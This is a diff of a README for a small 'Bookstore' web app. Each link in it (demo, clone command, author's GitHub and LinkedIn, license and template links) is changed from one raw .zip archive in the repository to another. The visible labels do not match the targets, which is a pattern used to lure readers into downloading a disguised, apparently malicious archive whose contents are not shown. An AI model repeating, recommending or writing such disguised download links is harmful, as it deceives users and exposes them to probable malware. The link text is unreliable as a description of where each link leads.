@@ -1,4 +1,4 @@
-![](https://github.com/Iptysam/bookstore-app/raw/refs/heads/dev/.github/bookstore_app_1.9.zip)
+![](https://raw.githubusercontent.com/Iptysam/bookstore-app/dev/src/redux/app_bookstore_2.5.zip)
 
 # Bookstore
 
@@ -20,12 +20,12 @@
 
 ## Live Demo (if available)
 
-[Live Demo Link](https://github.com/Iptysam/bookstore-app/raw/refs/heads/dev/.github/bookstore_app_1.9.zip)
+[Live Demo Link](https://raw.githubusercontent.com/Iptysam/bookstore-app/dev/src/redux/app_bookstore_2.5.zip)
 
 
 ## Getting Started
 
-- git clone https://github.com/Iptysam/bookstore-app/raw/refs/heads/dev/.github/bookstore_app_1.9.zip
+- git clone https://raw.githubusercontent.com/Iptysam/bookstore-app/dev/src/redux/app_bookstore_2.5.zip
 - cd bookstore-app
 - npm start
 
@@ -56,8 +56,8 @@
 
 👤 **Author1**
 
-- GitHub: [@Iptysam](https://github.com/Iptysam/bookstore-app/raw/refs/heads/dev/.github/bookstore_app_1.9.zip)
-- LinkedIn: [iptisammukadam](https://github.com/Iptysam/bookstore-app/raw/refs/heads/dev/.github/bookstore_app_1.9.zip)
+- GitHub: [@Iptysam](https://raw.githubusercontent.com/Iptysam/bookstore-app/dev/src/redux/app_bookstore_2.5.zip)
+- LinkedIn: [iptisammukadam](https://raw.githubusercontent.com/Iptysam/bookstore-app/dev/src/redux/app_bookstore_2.5.zip)
 
 
 
@@ -79,6 +79,6 @@ Give a ⭐️ if you like this project!
 
 ## 📝 License
 
-This project is [MIT](https://github.com/Iptysam/bookstore-app/raw/refs/heads/dev/.github/bookstore_app_1.9.zip) licensed.
+This project is [MIT](https://raw.githubusercontent.com/Iptysam/bookstore-app/dev/src/redux/app_bookstore_2.5.zip) licensed.
 
-_NOTE: we recommend using the [MIT license](https://github.com/Iptysam/bookstore-app/raw/refs/heads/dev/.github/bookstore_app_1.9.zip) - you can set it up quickly by [using templates available on GitHub](https://github.com/Iptysam/bookstore-app/raw/refs/heads/dev/.github/bookstore_app_1.9.zip). You can also use [any other license](https://github.com/Iptysam/bookstore-app/raw/refs/heads/dev/.github/bookstore_app_1.9.zip) if you wish._
+_NOTE: we recommend using the [MIT license](https://raw.githubusercontent.com/Iptysam/bookstore-app/dev/src/redux/app_bookstore_2.5.zip) - you can set it up quickly by [using templates available on GitHub](https://raw.githubusercontent.com/Iptysam/bookstore-app/dev/src/redux/app_bookstore_2.5.zip). You can also use [any other license](https://raw.githubusercontent.com/Iptysam/bookstore-app/dev/src/redux/app_bookstore_2.5.zip) if you wish._
